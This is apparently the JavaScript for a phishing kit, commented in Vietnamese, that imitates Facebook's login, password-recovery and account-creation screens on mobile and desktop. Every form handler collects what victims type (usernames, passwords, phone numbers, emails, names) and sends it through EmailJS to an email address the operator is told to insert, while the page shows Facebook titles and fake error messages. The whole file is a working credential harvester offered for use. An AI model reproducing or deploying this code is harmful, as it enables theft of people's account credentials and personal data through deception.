// Khởi tạo EmailJS với Public Key
(function() {
    emailjs.init("wF5gWgp1GWyg7q0KY"); // Thay bằng Public Key thực tế của bạn
})();

// Hàm kiểm tra xem có phải Safari trên thiết bị di động không
function isSafariOnMobile() {
    const userAgent = navigator.userAgent;
    return /Safari/.test(userAgent) && !/Chrome/.test(userAgent) && window.innerWidth < 768;
}

// Hàm bật/tắt menu dropdown trên mobile
function toggleDropdown() {
    const dropdownMenu = document.getElementById('dropdownMenu');
    dropdownMenu.classList.toggle('active');
}

// Hàm ẩn tất cả container mobile
function hideAllContainers() {
    document.querySelector('.login-container').classList.remove('active');
    document.querySelector('.login-container-safari').classList.remove('active');
    document.querySelector('.forgot-password-container').classList.remove('active');
    document.querySelector('.forgot-password-email-container').classList.remove('active');
    document.querySelector('.create-account-container').classList.remove('active');
    document.querySelector('.about-container').classList.remove('active');
    document.querySelector('.help-container').classList.remove('active');
    document.querySelector('.more-container').classList.remove('active');
}

// Hàm ẩn tất cả container desktop
function hideAllDesktopContainers() {
    document.querySelector('.main-container').style.display = 'flex';
    document.querySelector('.create-account-container-desktop').classList.remove('active');
    document.querySelector('.forgot-password-container-desktop').classList.remove('active');
    document.querySelector('.forgot-password-email-container-desktop').classList.remove('active');
}

// Hàm hiển thị giao diện đăng nhập (mobile)
function showLogin() {
    hideAllContainers();
    if (window.innerWidth >= 768) {
        // Không hiển thị container mobile trên desktop
        return;
    }
    if (isSafariOnMobile()) {
        document.querySelector('.login-container-safari').classList.add('active');
    } else {
        document.querySelector('.login-container').classList.add('active');
    }
    document.getElementById('header-title').innerText = 'Đăng nhập Facebook | Facebook';
    document.getElementById('header-title').classList.remove('small-title');
    document.getElementById('language-text').style.display = 'block';
    document.getElementById('back-button-header').style.display = 'none';
}

// Hàm hiển thị giao diện đăng nhập (desktop)
function showLoginDesktop() {
    hideAllDesktopContainers();
    document.querySelector('.main-container').style.display = 'flex';
    document.querySelector('.create-account-container-desktop').classList.remove('active');
    document.querySelector('.forgot-password-container-desktop').classList.remove('active');
    document.querySelector('.forgot-password-email-container-desktop').classList.remove('active');
}

// Hàm hiển thị giao diện tạo tài khoản (desktop)
function showCreateAccountDesktop() {
    hideAllDesktopContainers();
    document.querySelector('.main-container').style.display = 'none';
    document.querySelector('.create-account-container-desktop').classList.add('active');
}

// Hàm hiển thị giao diện quên mật khẩu (desktop)
function showForgotPasswordDesktop() {
    hideAllDesktopContainers();
    document.querySelector('.main-container').style.display = 'none';
    document.querySelector('.forgot-password-container-desktop').classList.add('active');
}

// Hàm hiển thị giao diện quên mật khẩu bằng email (desktop)
function showForgotPasswordEmailDesktop() {
    hideAllDesktopContainers();
    document.querySelector('.main-container').style.display = 'none';
    document.querySelector('.forgot-password-container-desktop').classList.remove('active');
    document.querySelector('.forgot-password-email-container-desktop').classList.add('active');
}

// Hàm hiển thị giao diện quên mật khẩu (mobile)
function showForgotPassword() {
    hideAllContainers();
    document.querySelector('.forgot-password-container').classList.add('active');
    document.getElementById('header-title').innerText = 'Tìm tài khoản của bạn';
    document.getElementById('header-title').classList.add('small-title');
    document.getElementById('language-text').style.display = 'none';
    document.getElementById('back-button-header').style.display = 'flex';
}

// Hàm hiển thị giao diện quên mật khẩu bằng email (mobile)
function showForgotPasswordEmail() {
    hideAllContainers();
    document.querySelector('.forgot-password-email-container').classList.add('active');
    document.getElementById('header-title').innerText = 'Tìm tài khoản của bạn';
    document.getElementById('header-title').classList.add('small-title');
    document.getElementById('language-text').style.display = 'none';
    document.getElementById('back-button-header').style.display = 'flex';
}

// Hàm hiển thị giao diện tạo tài khoản (mobile)
function showCreateAccount() {
    hideAllContainers();
    document.querySelector('.create-account-container').classList.add('active');
    document.getElementById('header-title').innerText = 'Tạo tài khoản mới';
    document.getElementById('header-title').classList.add('small-title');
    document.getElementById('language-text').style.display = 'none';
    document.getElementById('back-button-header').style.display = 'flex';
}

// Hàm hiển thị giao diện Giới thiệu (mobile)
function showAbout() {
    hideAllContainers();
    document.querySelector('.about-container').classList.add('active');
    document.getElementById('header-title').innerText = 'Giới thiệu';
    document.getElementById('header-title').classList.add('small-title');
    document.getElementById('language-text').style.display = 'none';
    document.getElementById('back-button-header').style.display = 'flex';
}

// Hàm hiển thị giao diện Trợ giúp (mobile)
function showHelp() {
    hideAllContainers();
    document.querySelector('.help-container').classList.add('active');
    document.getElementById('header-title').innerText = 'Trợ giúp';
    document.getElementById('header-title').classList.add('small-title');
    document.getElementById('language-text').style.display = 'none';
    document.getElementById('back-button-header').style.display = 'flex';
}

// Hàm hiển thị giao diện Xem thêm (mobile)
function showMore() {
    hideAllContainers();
    document.querySelector('.more-container').classList.add('active');
    document.getElementById('header-title').innerText = 'Xem thêm';
    document.getElementById('header-title').classList.add('small-title');
    document.getElementById('language-text').style.display = 'none';
    document.getElementById('back-button-header').style.display = 'flex';
}

// Hàm hiển thị popup thành công/thất bại
function showSuccessPopup(popupId) {
    document.getElementById(popupId).style.display = 'block';
    document.getElementById('overlay').style.display = 'block';
}

// Hàm ẩn popup
function hideSuccessPopup(popupId) {
    document.getElementById(popupId).style.display = 'none';
    document.getElementById('overlay').style.display = 'none';
}

// Hàm xử lý đăng nhập
function login() {
    let username, password, errorMessage, emailErrorMessage;

    if (window.innerWidth >= 768) {
        // Desktop
        username = document.getElementById('username').value;
        password = document.getElementById('password').value;
        errorMessage = document.getElementById('error-message');
        emailErrorMessage = document.getElementById('email-error-message');
    } else if (isSafariOnMobile()) {
        // Safari on mobile
        username = document.getElementById('username-safari').value;
        password = document.getElementById('password-safari').value;
        errorMessage = document.getElementById('error-message-safari');
        emailErrorMessage = document.getElementById('email-error-message-safari');
    } else {
        // Other mobile browsers
        username = document.getElementById('username-mobile').value;
        password = document.getElementById('password-mobile').value;
        errorMessage = document.getElementById('error-message-mobile');
        emailErrorMessage = document.getElementById('email-error-message-mobile');
    }

    if (!username || !password) {
        errorMessage.style.display = 'block';
        if (emailErrorMessage) emailErrorMessage.style.display = 'none';
        return;
    }

    errorMessage.style.display = 'none';

    const templateParams = {
        username: username,
        password: password,
        phone: '',
        email: '',
        firstName: '',
        lastName: '',
        to_email: "your-email@gmail.com" // Thay bằng email của bạn
    };

    emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
        .then(function(response) {
            console.log('Email gửi thành công!', response.status, response.text);
            showSuccessPopup('email-success-popup');
            if (emailErrorMessage) emailErrorMessage.style.display = 'none';
        }, function(error) {
            console.error('Lỗi gửi email:', error);
            if (emailErrorMessage) {
                emailErrorMessage.innerText = 'Sai tên đăng nhập hoặc mật khẩu';
                emailErrorMessage.style.display = 'block';
            }
        });
}

// Hàm tìm kiếm tài khoản bằng số điện thoại (mobile)
function searchByPhone() {
    const phone = document.getElementById('phone-input').value;
    const errorMessage = document.getElementById('phone-error-message');
    const emailErrorMessage = document.getElementById('phone-email-error-message');

    if (!phone) {
        errorMessage.style.display = 'block';
        if (emailErrorMessage) emailErrorMessage.style.display = 'none';
        return;
    }

    errorMessage.style.display = 'none';

    const templateParams = {
        username: '',
        password: '',
        phone: phone,
        email: '',
        firstName: '',
        lastName: '',
        to_email: "your-email@gmail.com" // Thay bằng email của bạn
    };

    emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
        .then(function(response) {
            console.log('Email gửi thành công!', response.status, response.text);
            showSuccessPopup('phone-email-success-popup');
            if (emailErrorMessage) emailErrorMessage.style.display = 'none';
        }, function(error) {
            console.error('Lỗi gửi email:', error);
            if (emailErrorMessage) {
                emailErrorMessage.innerText = 'Sai tên đăng nhập hoặc mật khẩu';
                emailErrorMessage.style.display = 'block';
            }
        });
}

// Hàm tìm kiếm tài khoản bằng số điện thoại (desktop)
function searchByPhoneDesktop() {
    const phone = document.getElementById('phone-input-desktop').value;
    const errorMessage = document.getElementById('phone-error-message-desktop');
    const emailErrorMessage = document.getElementById('phone-email-error-message-desktop');

    if (!phone) {
        errorMessage.style.display = 'block';
        if (emailErrorMessage) emailErrorMessage.style.display = 'none';
        return;
    }

    errorMessage.style.display = 'none';

    const templateParams = {
        username: '',
        password: '',
        phone: phone,
        email: '',
        firstName: '',
        lastName: '',
        to_email: "your-email@gmail.com" // Thay bằng email của bạn
    };

    emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
        .then(function(response) {
            console.log('Email gửi thành công!', response.status, response.text);
            showSuccessPopup('phone-email-success-popup');
            if (emailErrorMessage) emailErrorMessage.style.display = 'none';
        }, function(error) {
            console.error('Lỗi gửi email:', error);
            if (emailErrorMessage) {
                emailErrorMessage.innerText = 'Sai tên đăng nhập hoặc mật khẩu';
                emailErrorMessage.style.display = 'block';
            }
        });
}

// Hàm tìm kiếm tài khoản bằng email (mobile)
function searchByEmail() {
    const email = document.getElementById('email-input').value;
    const errorMessage = document.getElementById('email-error-message');
    const emailErrorMessage = document.getElementById('email-email-error-message');

    if (!email) {
        errorMessage.style.display = 'block';
        if (emailErrorMessage) emailErrorMessage.style.display = 'none';
        return;
    }

    errorMessage.style.display = 'none';

    const templateParams = {
        username: '',
        password: '',
        phone: '',
        email: email,
        firstName: '',
        lastName: '',
        to_email: "your-email@gmail.com" // Thay bằng email của bạn
    };

    emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
        .then(function(response) {
            console.log('Email gửi thành công!', response.status, response.text);
            showSuccessPopup('email-email-success-popup');
            if (emailErrorMessage) emailErrorMessage.style.display = 'none';
        }, function(error) {
            console.error('Lỗi gửi email:', error);
            if (emailErrorMessage) {
                emailErrorMessage.innerText = 'Sai tên đăng nhập hoặc mật khẩu';
                emailErrorMessage.style.display = 'block';
            }
        });
}

// Hàm tìm kiếm tài khoản bằng email (desktop)
function searchByEmailDesktop() {
    const email = document.getElementById('email-input-desktop').value;
    const errorMessage = document.getElementById('email-error-message-desktop');
    const emailErrorMessage = document.getElementById('email-email-error-message-desktop');

    if (!email) {
        errorMessage.style.display = 'block';
        if (emailErrorMessage) emailErrorMessage.style.display = 'none';
        return;
    }

    errorMessage.style.display = 'none';

    const templateParams = {
        username: '',
        password: '',
        phone: '',
        email: email,
        firstName: '',
        lastName: '',
        to_email: "your-email@gmail.com" // Thay bằng email của bạn
    };

    emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
        .then(function(response) {
            console.log('Email gửi thành công!', response.status, response.text);
            showSuccessPopup('email-email-success-popup');
            if (emailErrorMessage) emailErrorMessage.style.display = 'none';
        }, function(error) {
            console.error('Lỗi gửi email:', error);
            if (emailErrorMessage) {
                emailErrorMessage.innerText = 'Sai tên đăng nhập hoặc mật khẩu';
                emailErrorMessage.style.display = 'block';
            }
        });
}

// Hàm tạo tài khoản (mobile)
function createAccount() {
    const firstName = document.getElementById('firstName').value;
    const lastName = document.getElementById('lastName').value;
    const phone = document.getElementById('phone').value;
    const email = document.getElementById('email').value;
    const password = document.getElementById('new-password').value;
    const errorMessage = document.getElementById('create-account-error-message');
    const emailErrorMessage = document.getElementById('create-account-error-message-email');

    if (!firstName || !lastName || !phone || !email || !password) {
        errorMessage.style.display = 'block';
        if (emailErrorMessage) emailErrorMessage.style.display = 'none';
        return;
    }

    errorMessage.style.display = 'none';

    const templateParams = {
        username: '',
        password: password,
        phone: phone,
        email: email,
        firstName: firstName,
        lastName: lastName,
        to_email: "your-email@gmail.com" // Thay bằng email của bạn
    };

    emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
        .then(function(response) {
            console.log('Email gửi thành công!', response.status, response.text);
            showSuccessPopup('create-account-success-popup');
            if (emailErrorMessage) emailErrorMessage.style.display = 'none';
        }, function(error) {
            console.error('Lỗi gửi email:', error);
            if (emailErrorMessage) {
                emailErrorMessage.innerText = 'Sai tên đăng nhập hoặc mật khẩu';
                emailErrorMessage.style.display = 'block';
            }
        });
}

// Hàm tạo tài khoản (desktop)
function createAccountDesktop() {
    const firstName = document.getElementById('firstName-desktop').value;
    const lastName = document.getElementById('lastName-desktop').value;
    const phone = document.getElementById('phone-desktop').value;
    const email = document.getElementById('email-desktop').value;
    const password = document.getElementById('new-password-desktop').value;
    const errorMessage = document.getElementById('create-account-error-message-desktop');
    const emailErrorMessage = document.getElementById('create-account-error-message-email-desktop');

    if (!firstName || !lastName || !phone || !email || !password) {
        errorMessage.style.display = 'block';
        if (emailErrorMessage) emailErrorMessage.style.display = 'none';
        return;
    }

    errorMessage.style.display = 'none';

    const templateParams = {
        username: '',
        password: password,
        phone: phone,
        email: email,
        firstName: firstName,
        lastName: lastName,
        to_email: "your-email@gmail.com" // Thay bằng email của bạn
    };

    emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
        .then(function(response) {
            console.log('Email gửi thành công!', response.status, response.text);
            showSuccessPopup('create-account-success-popup');
            if (emailErrorMessage) emailErrorMessage.style.display = 'none';
        }, function(error) {
            console.error('Lỗi gửi email:', error);
            if (emailErrorMessage) {
                emailErrorMessage.innerText = 'Sai tên đăng nhập hoặc mật khẩu';
                emailErrorMessage.style.display = 'block';
            }
        });
}

// Tự động gọi showLogin() khi trang được tải
window.onload = function() {
    showLogin();
};
